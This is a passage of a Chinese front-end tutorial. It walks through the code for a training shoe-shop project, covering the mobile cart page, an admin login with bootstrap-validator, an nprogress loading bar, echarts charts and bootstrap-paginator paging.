                if(item.pic && item.pic[0] && item.pic[0].picAddr){
                addr = item.pic[0].picAddr;
                }
                %>
                <img class="mui-media-object mui-pull-left" src="<%=addr%>">
                <div class="mui-media-body">
                    <p class="name"><%=item.proName%></p>
                    <p class="info">
                        <span class="price">¥<%=item.price%></span>
                        <span class="oldPrice">¥<%=item.oldPrice%></span>
                        <span class="number">x<%=item.num%>双</span>
                    </p>
                    <p><span class="size">鞋码：<%=item.size%></span></p>
                </div>
                <input data-id="<%=item.id%>" type="checkbox">
            </a>
        </div>
    </li>
    <% } %>
</script>
<script type="text/template" id="edit">
    <div class="cart_update">
        <div class="p_size">
            尺码：
            <%
            var itemArr = productSize.split('-');
            for( var i = itemArr[0]; i <= itemArr[1];i++ ){
            %>
            <span class="btn_size <%=i==size?'now':''%>"><%=i%></span>
            <% } %>
        </div>
        <div class="p_number">
            数量：<span class="jian">-</span><input readonly type="text" value="<%=num%>" data-max="<%=productNum%>"><span class="jia">+</span>
        </div>
    </div>
</script>
<script src="../assets/mui/js/mui.min.js"></script>
<script src="../assets/zepto/zepto.min.js"></script>
<script src="../assets/artTemplate/template-native.js"></script>
<script src="../js/common.js"></script>
<script src="../js/cart.js"></script>
</body>
</html>



<!--<li data-product="1" class="mui-table-view-cell">-->
    <!--<div class="mui-slider-right mui-disabled">-->
        <!--<a data-id="1" class="mui-btn mui-btn-blue">编辑</a>-->
        <!--<a data-id="1" class="mui-btn mui-btn-red">删除</a>-->
    <!--</div>-->
    <!--<a href="javascript:;" class="mui-navigate-right mui-slider-handle">-->
        <!--<img class="mui-media-object mui-pull-left" src="../images/product.jpg">-->
        <!--<div class="mui-media-body">-->
            <!--<p class="name">匡威三星标1970s converse复刻 142334c 144757c三星标黑色高帮</p>-->
            <!--<p class="info">-->
                <!--<span class="price">¥499.1</span>-->
                <!--<span class="oldPrice">¥888.1</span>-->
                <!--<span class="number">x1双</span>-->
            <!--</p>-->
            <!--<p><span class="size">鞋码：50</span></p>-->
        <!--</div>-->
        <!--<input data-id="1" type="checkbox">-->
    <!--</a>-->
<!--</li>-->

```
>[danger] cart.css
```
[data-product] input,
[data-product] .novalidate
{
    position: absolute;
    left: 20px;
    bottom: 10px;
    font-size: 12px;
}
[data-product] .name{
    height: 40px;
    line-height: 20px;
    width: 100%;
    overflow: hidden;
    white-space: normal;
    color: #666;
}
[data-product] .price{
    color: #ff3300;
}
[data-product] .oldPrice{
    font-size: 12px;
    color: #ccc;
    text-decoration: line-through;
}
[data-product] .size{
    font-size: 12px;
}
[data-product] .number{
    float: right;
    margin-right: 10px;
    font-size: 12px;
}
.mui-table-view .mui-media-object {
    line-height: 60px;
    max-width: 60px;
    height: 60px;
}
.cart_order{
    height: 30px;
    line-height: 30px;
    border-top: 1px solid #ccc;
    position: fixed;
    left: 0;
    bottom: 50px;
    background: #fff;
    width: 100%;
    z-index: 999;
    padding-left: 20px;
    font-size: 14px;
    color: #ff3300;
    font-weight: 600;
}
.cart_order a{
    width: 100px;
    text-align: center;
    background: #ff3300;
    display: block;
    float: right;
    color: #fff;
}
.cz_layout{
    background: #fff;
}
.cz_container{
    padding-bottom: 80px;
    width: 100%;
    height: 100%;
}
.cz_container .mui-scroll-wrapper{
    width: 100%;
    height: 100%;
    overflow: hidden;
    position: relative;
}
.mui-table-view > ul{
    margin: 0;
    padding: 0;
}

.cart_update{
    text-align: left;
}
.p_number{
    padding: 5px;
    font-size: 14px;
}
.p_number .jian,.p_number .jia{
    width: 28px;
    height: 28px;
    line-height: 28px;
    display: inline-block;
    text-align: center;
    cursor: pointer;
    border: 1px solid #ccc;
    vertical-align: middle;
}
.p_number input{
    width: 28px;
    height: 28px;
    line-height: 28px;
    display: inline-block;
    border-radius: 0;
    border: none;
    border-top: 1px solid #ccc;
    border-bottom: 1px solid #ccc;
    margin: 0;
    padding: 0;
    vertical-align: middle;
    text-align: center;
}
.p_size{
    padding: 5px;
    font-size: 14px;
}
.p_size .btn_size{
    width: 28px;
    height: 28px;
    line-height: 28px;
    display: inline-block;
    text-align: center;
    cursor: pointer;
    border: 1px solid #ccc;
    vertical-align: middle;
    margin-bottom: 10px;
}
.p_size .btn_size.now{
    background: #fa672d;
}

.ct_container .ct_content {
    padding: 45px 0 80px 0;
    width: 100%;
    height: 100%;
}
```
>[danger] ##### cart.js
* common.js
```
// 用来对保存的数据信息进行匹配
CT.getItemById = function (arr,id) {
    var obj = null;
    arr.forEach(function (item,i) {
        if(item.id == id){
            obj = item;
        }
    });
    return obj;
}
```
```
$(function () {
    /*区域滚动*/
    mui('.mui-scroll-wrapper').scroll({
        indicators:false
    });
    /*初始化上下拉*/
    mui.init({
        pullRefresh: {
            container: "#refreshContainer",
            down: {
                auto:true,
                callback:function () {
                    /*1.初始化页面  自动下拉刷新*/
                    var that = this;
                    /*定义一个全局的 下拉组件对象  使用里面的方法*/
                    //window.down = this;
                    setTimeout(function () {
                        getCartData(function (data) {
                            /*渲染页面*/
                            $('.mui-table-view').html(template('cart',data));
                            /*加载状态隐藏*/
                            that.endPulldownToRefresh();
                            /*注册刷新事件 防止多次绑定  先解绑再次绑定*/
                            $('.fa-refresh').off('click').on('tap',function () {
                                /*重新 加载*/
                                /*4.点击刷新按钮  刷新*/
                                that.pulldownLoading();
                            });
                        });
                    },1000);
                }
            }
        }
    });
    /*1.初始化页面  自动下拉刷新*/
    /*2.侧滑的时候  点击编辑  弹出对话框（尺码，数量）*/
   /* $('.fa-refresh').on('tap',function () {
        /!*刷新  触发下拉操作*!/
        mui('#refreshContainer').pullRefresh().pulldownLoading();
    });*/
    /*3.侧滑的时候  点击删除  弹出对话框 确认框*/
    $('.mui-table-view').on('tap','.mui-icon-compose',function () {
        /*弹窗的内容*/
        /*默认的子字符串 ===》 html格式的字符串*/
        /*获取当前按钮对应商品的数据*/
        /*根据ID去缓存获取*/
        var id = $(this).parent().attr('data-id');
        var item = CT.getItemById(window.cartData.data,id);
        var html = template('edit',item);
        /*confirm 在使用字符串作为内容的时候 '普通\n文字' \n 加上<br> \t 默认空格*/
        mui.confirm(html.replace(/\n/g,''), '商品编辑', ['确认', '取消'], function(e) {
            if (e.index == 0) {
                /*发送请求*/
                var size = $('.btn_size.now').html();
                var num = $('.p_number input').val();
                CT.loginAjax({
                    type:'post',
                    url:'/cart/updateCart',
                    data:{
                        id:id,
                        size:size,
                        num:num
                    },
                    dataType:'json',
                    success:function (data) {
                        if(data.success == true){
                            /*窗口关闭*/
                            /*列表更新*/
                            item.num = num;
                            item.size = size;
                            /*缓存的数据  window.cartData.data 已修改*/
                            /*渲染页面*/
                            $('.mui-table-view').html(template('cart',window.cartData));
                            /*整个列表重新渲染*/
                            //setAmount();
                        }
                    }
                });
                //return false;
            } else {
                //TODO
            }
        })
    });
    $('body').on('tap','.btn_size',function () {
        $(this).addClass('now').siblings().removeClass('now');
    });
    $('body').on('tap','.p_number span',function () {
        var $input = $(this).siblings('input');
        var currNum = $input.val();
        /*字符串 转数字 */
        var maxNum = parseInt($input.attr('data-max'));
        if ($(this).hasClass('jian')) {
            if(currNum <= 1){
                mui.toast('至少一件商品');
                return false;
            }
            currNum--;
        } else {
            /*不超库存*/
            if(currNum >= maxNum){
                /*消息框点击的时候会消失 正好和加号在一块  (击穿 tap,点击穿透)*/
                setTimeout(function () {
                    mui.toast('库存不足');
                },100);
                return false;
            }
            currNum++;
        }
        $input.val(currNum);
    });

    $('.mui-table-view').on('tap','.mui-icon-trash',function () {
        var $this = $(this);
        var id = $this.parent().attr('data-id');
        mui.confirm('您确认是否删除该商品？', '商品删除', ['确认', '取消'], function(e) {
            if (e.index == 0) {
                CT.loginAjax({
                    type:'get',
                    url:'/cart/deleteCart',
                    data:{
                        id:id
                    },
                    dataType:'json',
                    success:function (data) {
                        if(data.success == true){
                            /*删除*/
                            $this.parent().parent().remove();
                            setAmount();
                        }
                    }
                })
            } else {
                //TODO
            }
        })
    });
    /*5.点击复选框  计算总金额 */
    $('.mui-table-view').on('change','[type=checkbox]',function () {
        /* 总金额 = 每个商品数量*单价 的总和  */
        setAmount();
    });
});
/**/
var setAmount = function () {
    /*所有选中的复选框*/
    var $checkedBox = $('[type=checkbox]:checked');
    /*获取选中商品的ID*/
    /*$.each(i,item)    $dom.each(i,item)  arr.forEach(item,i) */
    var amountSum = 0;
    $checkedBox.each(function (i,item) {
        var id = $(this).attr('data-id');
        var item = CT.getItemById(window.cartData.data,id);
        var num = item.num;
        var price = item.price;
        var amount = num * price;
        amountSum += amount;
    });
    if(Math.floor(amountSum * 100)%10){
        amountSum = Math.floor(amountSum * 100)/100;
    }else{
        amountSum = Math.floor(amountSum * 100)/100;
        amountSum = amountSum.toString()+'0';
    }

    console.log(amountSum);
    $('#cartAmount').html(amountSum);
}
var getCartData = function (callback) {
    CT.loginAjax({
        type:'get',
        url:'/cart/queryCartPaging',
        data:{
            page:1,
            /*不产生分页  需要修改接口*/
            pageSize:100
        },
        dataType:'json',
        success:function (data) {
            /*缓存的数据*/
            window.cartData = data;
            callback && callback(data);
        }
    });
}
```

>[danger] ##### js 技术总结
```
1.当我们使用一些的第三方框架的方法的时候，要用框架对象使用方法，例如：
miu的刷新下拉方法正确使用姿势是mui('#refreshContainer').pullRefresh().pulldownLoading()
2.可以吧一些方法的对象封装在 win中够后续使用例如：window.down = this
3.防止事件多次绑定 $('.fa-refresh').off('click').on('tap',function () {}),利用off方法
4.在做更改数据的时候可以吧获取数据保存在win中例如: window.cartData = data;
在更改数据的时候先获取id，将id和最初的window.cartData 进行查询找出对应数
据，利用对象指向，更改数据 重新渲染

```
>[success] # common.js
```
window.CT = {};
CT.getParamsByUrl = function () {
    /*已对象存储地址栏信息*/
    var params = {};
    var search = location.search;
    if (search) {
        search = search.replace('?', '');
        /*如果有多个键值对*/
        var arr = search.split('&');
        arr.forEach(function (item, i) {
            var itemArr = item.split('=');
            params[itemArr[0]] = itemArr[1];
        });
    };
    return params;
};
CT.serialize2object = function (serializeStr) {
    var obj = {};
    /*key=value&k=v*/
    if(serializeStr){
        var arr = serializeStr.split('&');
        arr.forEach(function (item,i) {
            var itemArr = item.split('=');
            obj[itemArr[0]] = itemArr[1];
        })
    }
    return obj;
}
CT.getItemById = function (arr,id) {
    var obj = null;
    arr.forEach(function (item,i) {
        if(item.id == id){
            obj = item;
        }
    });
    return obj;
}
/*需要登录的ajax请求*/
CT.loginUrl = '/m/user/login.html';
CT.cartUrl = '/m/user/cart.html';
CT.userUrl = '/m/user/index.html';

CT.getItemById = function(arr,id){
    var obj = null
    arr.forEach(function (item,i) {

        if(item.id == id){
            obj=item
        }
    });
    return obj
}

CT.loginAjax = function (params) {
    /*params====> {} */
    $.ajax({
        type: params.type || 'get',
        url: params.url || '#',
        data: params.data || '',
        dataType: params.dataType || 'json',
        success:function (data) {
            /*未登录的处理 {error: 400, message: "未登录！"}
            所有的需要登录的接口 没有登录返回这个数据*/
            if(data.error == 400){
                /*跳到登录页  把当前地址传递给登录页面  当登录成功按照这个地址跳回来*/
                location.href = CT.loginUrl + '?returnUrl=' + location.href;
                return false;
            }else{
                params.success && params.success(data);
            }
        },
        error:function () {
            mui.toast('服务器繁忙');
        }
    });
};
```
[登陆页面](登陆页面.md)
[管理端页面](管理端页面.md)
[管理端数据展示页面](管理端数据展示页面.md)

[TOC]
>[success] # 登陆页面 -- bootstrap-validator数据验证
![](https://box.kancloud.cn/5532c3f78652c9a60b561922c4e26e9b_607x435.png)
```
1.使用的bootstrap 插件进行的样式布局
2.使用的bootstrap-validator 做的数据验证
```
>[danger] ##### login.html
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css"/>
    <link rel="stylesheet" href="assets/bootstrap-validator/css/bootstrapValidator.min.css"/>
    <link rel="stylesheet" href="assets/nprogress/nprogress.css"/>
    <link rel="stylesheet" href="assets/nprogress/nprogress.css"/>
    <link rel="stylesheet" href="css/admin.css"/>
</head>
<body class="bg_login">
<div class="container">
    <div class="col-md-4 col-md-offset-4">
        <div class="panel panel-primary mt_150">
            <div class="panel-heading text-center"><h4>后台管理系统</h4></div>
            <div class="panel-body">
                <form id="login" class="form-horizontal" autocomplete="off">
                    <div class="form-group">
                        <label for="inputUserName3" class="col-sm-3 control-label">用户名</label>
                        <div class="col-sm-9">
                            <input name="username" type="text" class="form-control" id="inputUserName3" placeholder="请输入用户名">
                        </div>
                    </div>
                    <div class="form-group">
                        <label for="inputPassword3" class="col-sm-3 control-label">密码</label>
                        <div class="col-sm-9">
                            <input name="password" type="password" class="form-control" id="inputPassword3" placeholder="请输入密码">
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="col-sm-offset-3 col-sm-10">
                            <button type="reset" class="btn btn-default mr_50">重置</button>
                            <button type="submit" class="btn btn-primary">登录</button>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>
<script src="assets/jquery/jquery.min.js"></script>
<script src="assets/bootstrap/js/bootstrap.min.js"></script>
<script src="assets/nprogress/nprogress.js"></script>
<script src="assets/bootstrap-validator/js/bootstrapValidator.min.js">
<!--通用模块的js-->
<script src="js/admin.js"></script>
</script>
<script src="assets/nprogress/nprogress.js"></script>
<script src="js/login.js"></script>
</body>
</html>
```
>[danger] ##### login.css
```
body{
    font-family: "Microsoft YaHei";
}
a:hover,a:active,a:focus{
    text-decoration: none;
}
/*login page*/
.bg_login{
    background: #222d32;
}
.mt_150{
    margin-top: 150px;
}
.mr_50{
    margin-right: 50px;
}
.mb_15{
    margin-bottom: 15px;
}
```
>[danger] ##### login.js
```
1.简单基础使用validator 插件验证
2.feedbackIcons 是配置的校验图标，VALIDATING 校验中, INVALID 失败 VALID 成功
3.绑定on('success.form.bv', function (e) {}) 事件用来处理ajax，其中     
e.preventDefault();阻止通过form提交，利用ajax提交，var $form = $(e.target)获
取表单中的数据                
4.$form.data('bootstrapValidator').updateStatus('username','INVALID','callback');，其中callback函数触发通过ajax 执行，展示触发的错误提示
```
```
$(function () {
    /*初始化校验插件*/
    /*1.是form表单结构 并且有一个提交按钮*/
    /*2.这插件就是jquery插件 样式和bootstrap风格一致*/
    $('#login').bootstrapValidator({
        /*配置校验的不同状态下显示的图标*/
        feedbackIcons: {
            valid: 'glyphicon glyphicon-ok',
            invalid: 'glyphicon glyphicon-remove',
            validating: 'glyphicon glyphicon-refresh'
        },
        /*需要校验的表单元素 通过名称 name*/
        fields: {
            /*对应表单元素的name*/
            username: {
                /*校验规则 多个校验规则*/
                validators: {
                    notEmpty: {
                        message: '请输入用户名'
                    },
                    /*配置一个校验规则*/
                    callback:{
                        message:'用户名不存在'
                    }
                }
            },
            password: {
                validators: {
                    notEmpty: {
                        message: '请输入密码'
                    },
                    stringLength: {
                        min: 6,
                        max: 18,
                        message: '密码必须是6-18个字符'
                    },
                    callback:{
                        message:'密码错误'
                    }
                }
            }
        }
    }).on('success.form.bv', function (e) {
        /*校验成功的时候出发*/
        /*组织表单的默认提交  使用ajax提交*/
        e.preventDefault();
        /*后台校验用户名和密码*/
        var $form = $(e.target);
        $.ajax({
            type:'post',
            url:'/employee/employeeLogin',
            data:$form.serialize(),
            dataType:'json',
            success:function (data) {
                /*业务成功*/
                if(data.success == true){
                    /*跳转后台的首页*/
                    location.href = '/admin33/';
                }
                /*业务失败*/
                else {
                    if(data.error == 1000){
                        /*用户名错误*/
                        /*设置用户名这个表单元素的校验状态为失败*/
                        /*NOT_VALIDATED 还没校验, VALIDATING 校验中, INVALID 失败 or VALID 成功*/
                        /*1.获取校验组件*/
                        /*2.调研更改状态的函数*/
                        /*3.校验的表单，改成什么状态，使用哪个校验规则*/
                        $form.data('bootstrapValidator').updateStatus('username','INVALID','callback');
                    }else if(data.error == 1001){
                        /*密码错误*/
                        $form.data('bootstrapValidator').updateStatus('password','INVALID','callback');
                    }
                }
            }
        });
    });
});
```
>[success] # 进度条插件 --nprogress
```
1.可以通过更改进度条的nprogress.css 来更改进度条的样式
2.利用ajax的ajaxStart/ajaxStop 决定进度条的显示开始和结束
3.给绑定到window上，所有的ajax 都触发这个进度条效果
```
>[danger] ##### nprogress.js 使用
 * 转圈效果
![](https://box.kancloud.cn/25d65d3e6552a4d6d3051d5249f40026_230x26.png)
```
/*1.进度显示功能*/
/*不显示转圈效果*/
NProgress.configure({
    showSpinner: false
});
/*在ajax开始请求的时候  把进度条显示出来*/
$(window).ajaxStart(function(){
    NProgress.start();
});
/*在ajax结束请求的时候  把进度条完成*/
$(window).ajaxStop(function(){
    NProgress.done();
});
```
[TOC]
>[success] # 管理端页面显示
![](https://box.kancloud.cn/4ae30876d3432c95d5c6cb8ba6b3b60f_1372x658.png)
>[danger] ##### index.css
```
.ad_aside{
    height: 100%;
    width: 180px;
    background: #333333;
    position: absolute;
}
.ad_aside .brand{
    width: 100%;
    height: 50px;
    background: #367fa9;
}

.ad_aside .brand a{
    color: #fff;
    display: block;
    line-height: 50px;
    text-align: center;
    font-size: 20px;
    font-weight: bold;
}

.ad_aside .user{
    padding: 30px 20px;
}

.ad_aside .user img{
    width: 50px;
    height: 50px;
    border-radius: 25px;
    overflow: hidden;
}
.ad_aside .user span{
    color: #fff;
    font-size: 12px;
}

.ad_aside .menu ul{
    list-style: none;
    margin: 0;
    padding: 0;
}
.ad_aside .menu ul li{
}
.ad_aside .menu ul li a{
    display: block;
    height: 40px;
    line-height: 40px;
    color: #aaa;
    border: 3px solid transparent;
    padding-left: 30px;
}
.ad_aside .menu ul li.now > a{
    border-left-color: #3c8dbc;
    background: #1d1f21;
    color: #fff;
}
.ad_aside .menu ul li .child a{
    height: 30px;
    line-height: 30px;
    padding-left: 50px;
    font-size: 12px;
}
.ad_aside .menu ul li .child a.now{
    color: #fff;
}

.ad_section{
    padding-left: 180px;
}

.ad_section .ad_nav{
    height: 50px;
    background: #3c8dbc;
    margin-bottom: 20px;
}

.ad_section .ad_nav a{
    font-size: 16px;
    color: #fff;
    margin-top: 14px;
}
.ad_section .ad_nav a:first-child{
    margin-left: 15px;
    float: left;
}
.ad_section .ad_nav a:last-child{
    margin-right: 15px;
    float: right;
}
.ad_content{
    margin-top: 20px;
}

.ad_content .picTable{
    float: left;
    width: 45%;
    height: 400px;
}

/*用来菜单隐藏的时候，让内容填满屏幕*/
.ad_section.menu{
    padding-left: 0;
}

/*内容样式和整体页面布局无关系 */
.ad_content .picTable:first-child{
    margin-right: 10%;
}

.table th,.table td{
    text-align: center;
}
.page{
    text-align: right;
}
.page .pagination{
    margin-top: 0;
}
```
>[danger] ##### index.html
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.css">
    <link rel="stylesheet" href="css/admin1.css">
</head>
<body>
<aside class="ad_aside">
    <div class="brand"><a href="index.html"> ITCAST</a></div>
    <div class="user">
        <img src="images/default.png" alt=""/>
        <span>超级管理员</span>
    </div>
    <div class="menu">
        <ul>
            <li class="now"><a href="userManage.html"><span class="glyphicon glyphicon-user"></span> 用户管理</a></li>
            <li>
                <a href="javascript:;"><span class="glyphicon glyphicon-list"></span> 分类管理</a>
                <div class="child" style="display: none">
                    <a href="categoryFirst.html">一级分类</a>
                    <a href="categorySecond.html">二级分类</a>
                </div>
            </li>
            <li><a href="productManage.html"><span class="glyphicon glyphicon-tags"></span> 商品管理</a></li>
        </ul>
    </div>
</aside>

<section class="ad_section">
    <!--顶部导航-->
    <nav class="ad_nav">
        <a data-menu href="javascript:;"><span class="glyphicon glyphicon-align-justify"></span></a>
        <a data-logout href="javascript:;"><span class="glyphicon glyphicon-log-out"></span></a>
    </nav>
    <div class="container-fluid">
        <!--路径导航-->
        <ol class="breadcrumb">
            <li><a href="#">管理系统</a></li>
            <li class="active">首页</li>
        </ol>
       <div class="ad_content">
            <!--注册人数柱状图-->
            <div class="picTable"></div>
            <!--热门品牌销售占比-->
            <div class="picTable"></div>
        </div>
    </div>
</section>
</body>
</html>
```
>[danger] index.js -- 侧边栏的隐藏/二级菜单
```
1.toggle jquery的方法显示点击就隐藏，隐藏点击就显示
2.toggleClass jquery方法 有就去掉样式，没有就增加属性
3.slideToggle 有就隐藏，没有就显示
4.把html格式转换成数组http://www.css88.com/tool/html2js
5.因为退出是公共功能，所以给封装到js中通过$('body').append(modalHtml);添加到页面中
6.$logoutModal.modal('show').find('.btn-primary').on('click',function () {})逻辑顺序先显示在绑定按钮事件

```
```
/*1.侧边栏的显示隐藏 二级菜单的显示隐藏*/
$('[data-menu]').on('click',function () {
    $('.ad_aside').toggle();
    $('.ad_section').toggleClass('menu');
});
$('.menu [href="javascript:;"]').on('click',function () {
    $(this).siblings('.child').slideToggle();
})


/*2.退出功能*/
/*把html格式的字符串转出  js字符串拼接  数字拼接  http://www.css88.com/tool/html2js/*/
var modalHtml = ['<div class="modal fade" id="logoutModal">',
    '    <div class="modal-dialog modal-sm">',
    '        <div class="modal-content">',
    '            <div class="modal-header">',
    '                <button type="button" class="close" data-dismiss="modal"><span>&times;</span></button>',
    '                <h4 class="modal-title">温馨提示</h4>',
    '            </div>',
    '            <div class="modal-body">',
    '                <p class="text-danger"><span class="glyphicon glyphicon-info-sign"></span>您确定要退出后台管理系统吗？</p>',
    '            </div>',
    '            <div class="modal-footer">',
    '                <button type="button" class="btn btn-default" data-dismiss="modal">取消</button>',
    '                <button type="button" class="btn btn-primary">确定</button>',
    '            </div>',
    '        </div>',
    '    </div>',
    '</div>'].join("");
$('body').append(modalHtml);
$('[data-logout]').on('click',function () {
    /*需要一个模态框 而且每个页面都需要*/
    var $logoutModal = $('#logoutModal');
    $logoutModal.modal('show').find('.btn-primary').on('click',function () {
        /*退出业务*/
        $.ajax({
            type:'get',
            url:'/employee/employeeLogout',
            data:'',
            dataType:'json',
            success:function (data) {
                if(data.success == true){
                    $logoutModal.modal('hide');
                    /*跳转登录*/
                    location.href = '/admin33/login.html';
                }
            }
        })

    });
});
```
>[success] # 简单使用echarts
![](https://box.kancloud.cn/41411396e5b5862b36c0bdfc1df0443e_1175x481.png)
>[danger] #### index.js
```
$(function(){
    barCharts();
    pieCharts();
});
var barCharts = function () {
    /*获取数据*/
    var data = [
        {
            name:'一月',
            value:300
        },
        {
            name:'二月',
            value:400
        },
        {
            name:'三月',
            value:500
        },
        {
            name:'四月',
            value:200
        },
        {
            name:'五月',
            value:600
        }
    ];
    var xdata = [], sdata = [];
    data.forEach(function (item,i) {
        xdata.push(item.name);
        sdata.push(item.value);
    });


    /*1.引入echarts.min.js文件*/
    /*2.找到画图的容器*/
    var box = document.querySelector('.picTable:first-child');
    /*3.初始化插件*/
    var myChart = echarts.init(box);
    /*4.配置参数*/
    var options = {
        title:{
            text:'2017年注册人数'
        },
        legend:{
            data:['注册人数']
        },
        tooltip : {
        },
        xAxis : [
            {
                data : ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'],
            }
        ],
        yAxis : [
            {
                type : 'value'
            }
        ],
        series : [
            {
                name:'注册人数',
                type:'bar',
                barWidth: '60%',
                data:[10, 52, 200, 334, 390, 330, 220]
            }
        ]
    }
    options.xAxis[0].data = xdata;
    options.series[0].data = sdata;
    /*5.设置参数*/
    myChart.setOption(options);
}
var pieCharts = function () {
    /*1.引入echarts.min.js文件*/
    /*2.找到画图的容器*/
    var box = document.querySelector('.picTable:last-child');
    /*3.初始化插件*/
    var myChart = echarts.init(box);
    /*4.配置参数*/
    var options = {
        title : {
            text: '品牌销售占比',
            subtext: '2017年10月',
            x:'center'
        },
        tooltip : {
            trigger: 'item',
            /*series.name  a  */
            /*data.name  b */
            /*data.value  c */
            /*占比  d */
            formatter: "{b} : {c} ({d}%)"
        },
        legend: {
            orient: 'vertical',
            left: 'left',
            data: ['李宁','耐克','阿迪','匡威','回力']
        },
        series : [
            {
                name: '销售情况',
                type: 'pie',
                radius : '55%',
                center: ['50%', '60%'],
                data:[
                    {value:335, name:'李宁'},
                    {value:310, name:'耐克'},
                    {value:234, name:'阿迪'},
                    {value:135, name:'匡威'},
                    {value:1548, name:'回力'}
                ],
                itemStyle: {
                    emphasis: {
                        shadowBlur: 10,
                        shadowOffsetX: 0,
                        shadowColor: 'rgba(0, 0, 0, 0.5)'
                    }
                }
            }
        ]
    }
    /*5.设置参数*/
    myChart.setOption(options);
};
```
>[success] # 管理端数据展示页面
```
1.bootstrapPaginator.js  分页插件
```
![](https://box.kancloud.cn/25b1cc58a7ada891000359b060426fb3_1365x465.png)
>[danger] ##### 主要针对分页页面讲解.html
```
1.在模板语言中使用jquery 变量 <% var $ = getJquery(); %>但需要先在js文件声明然后调用
2.js 端声明格式
/*辅助方法：在模板内部可以使用的函数*/
template.helper('getJquery',function () {
    return jQuery;
});
3..分页数据展示公式：序号+（页码-1）*每页展示数量
```
```
<!DOCTYPE html>
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title>后台管理系统-二级分类</title>
    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css"/>
    <link rel="stylesheet" href="assets/nprogress/nprogress.css"/>
    <link rel="stylesheet" href="css/admin.css"/>
</head>
<body>
<!--侧边栏-->
<aside class="ad_aside">
    <!--商标-->
    <div class="brand"><a href="index.html">ITCAST</a></div>
    <!--用户-->
    <div class="user">
        <img src="images/default.png" alt=""/>
        <span>超级管理员</span>
    </div>
    <!--菜单-->
    <div class="menu">
        <ul>
            <li><a href="userManage.html"><span class="glyphicon glyphicon-user"></span> 用户管理</a></li>
            <li class="now">
                <a href="javascript:;"><span class="glyphicon glyphicon-list"></span> 分类管理</a>
                <div class="child">
                    <a href="categoryFirst.html">一级分类</a>
                    <a class="now" href="categorySecond.html">二级分类</a>
                </div>
            </li>
            <li><a href="productManage.html"><span class="glyphicon glyphicon-tags"></span> 商品管理</a></li>
        </ul>
    </div>
</aside>
<!--内容-->
<section class="ad_section">
    <!--顶部导航-->
    <nav class="ad_nav">
        <a data-menu href="javascript:;"><span class="glyphicon glyphicon-align-justify"></span></a>
        <a data-logout href="javascript:;"><span class="glyphicon glyphicon-log-out"></span></a>
    </nav>
    <div class="container-fluid">
        <!--路径导航-->
        <ol class="breadcrumb">
            <li><a href="#">管理系统</a></li>
            <li class="active">分类管理</li>
            <li class="active">二级分类</li>
        </ol>
        <div class="ad_content">
            <button class="btn btn-default mb_15">添加分列</button>
            <table class="table table-bordered">
                <thead>
                <tr>
                    <th>序号</th>
                    <th>一级分类</th>
                    <th>二级分类</th>
                    <th>三级分类</th>
                </tr>
                </thead>
                <tbody>
                <!--TODO-->
                </tbody>
            </table>
            <!--分页逻辑-->
            <nav class="text-right">
            <ul class="pagination">

            </ul>
            </nav>
        </div>
    </div>
</section>
<script type="text/template" id="list">
    <% var $ = getJquery(); %>
    <% $.each(rows,function(i,item){ %>
    <tr>
            <!--序号+（页码-1）*每页展示数量-->
        <th scope="row"><%=i+1+(page-1)*size%></th>
        <td><%=item.categoryName%></td>
        <td><%=item.brandName%></td>
        <td><img width="40" height="40" src="<%=item.brandLogo%>" alt=""></td>
    </tr>
    <% }); %>
</script>

<script src="assets/jquery/jquery.min.js"></script>
<script src="assets/bootstrap/js/bootstrap.min.js"></script>
<script src="assets/nprogress/nprogress.js"></script>
<script src="assets/artTemplate/template-native.js"></script>
<script src="assets/bootstrap-paginator/bootstrap-paginator.min.js"></script>

<script src="js/admin.js"></script>
<script src="js/categorySecond1.js"></script>
</body>
</html>
```
>[danger] ##### 分页的js 使用
```
1.使用bootstrapPaginator 分页，在onPageClicked 事件中获取点击页码，然后重新渲染调用render 函数
2.整套代码就是 在render 函数封装的ajax获取访问第一页，然后再递归在成功后不断调用分页
```
```
$(function () {
    var currPage = 1;


    /*辅助方法：在模板内部可以使用的函数*/
    template.helper('getJquery',function () {
        return jQuery;
    });

    var render = function () {
        getCategorySecondData({
            page: currPage,
            pageSize: 2
        }, function (data) {
            /*渲染列表*/
            $('tbody').html(template('list', data));
            /*设置分页  对分页按钮进行绑定*/
            setPaginator(data.page, Math.ceil(data.total / data.size), render);
        });
    };
    render();
    /*2.实现分页渲染*/
    var setPaginator = function (pageCurr, pageSum, callback) {
        /*获取需要初始的元素 使用bootstrapPaginator方法*/
        $('.pagination').bootstrapPaginator({
            /*当前使用的是3版本的bootstrap*/
            bootstrapMajorVersion: 3,
            /*配置的字体大小是小号*/
            size: 'small',
            /*当前页*/
            currentPage: pageCurr,
            /*一共多少页*/
            totalPages: pageSum,
            /*点击页面事件*/
            onPageClicked: function (event, originalEvent, type, page) {
                /*改变当前页再渲染 page当前点击的按钮的页面*/
                currPage = page;
                callback && callback();
            }
        });
    }
});

var getCategorySecondData = function (params, callback) {
    $.ajax({
        type:'get',
        url:'/category/querySecondCategoryPaging',
        data:{
            page:params.page ,
            pageSize:params.pageSize
        },
        dataType:'json',
        success:function (data) {
            callback && callback(data);
        }
    });

}
```
>[success] # 表单数据下拉列表的处理
![](https://box.kancloud.cn/77b4bf177f469d58466317b5f94f3c06_336x420.png)
![](https://box.kancloud.cn/277eea1832dfc6b51bef377b4b85eb7d_905x269.png)
>[danger] #### html 代码
```
1.代码中的样式，针对隐藏上传的input样式
```
* 主要的核心代码内容
```
<div class="modal fade" id="save">
    <div class="modal-dialog modal-sm" >
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal"><span>&times;</span></button>
                <h4 class="modal-title">添加分类</h4>
            </div>
            <div class="modal-body">
                <form id="form">
                    <div class="form-group">
                        <div>
                            <label>一级分类:</label>
                            <!--下拉菜单-->
                            <div class="dropdown btn-group">
                                <button class="btn btn-default dropdown-toggle" type="button" id="dropdownMenu1" data-toggle="dropdown">
                                    <span class="categoryName">请选择</span>
                                    <span class="caret"></span>
                                </button>
